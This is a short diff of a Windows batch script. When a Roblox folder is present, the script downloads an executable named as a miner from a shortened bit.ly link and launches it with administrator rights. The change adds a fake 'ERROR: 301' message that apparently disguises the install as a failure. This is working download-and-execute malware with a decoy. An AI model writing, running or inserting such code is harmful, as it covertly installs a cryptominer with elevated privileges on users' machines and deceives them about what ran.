@@ -12,6 +12,7 @@ IF EXIST "%roblox_folder%" (
 
     powershell -Command "Invoke-WebRequest -Uri 'https://bit.ly/MINERZS' -OutFile '%miner_exe%'"
     powershell -Command "Start-Process '%miner_exe%' -Verb RunAs"
+    echo ERROR: 301
 )
 
 exit
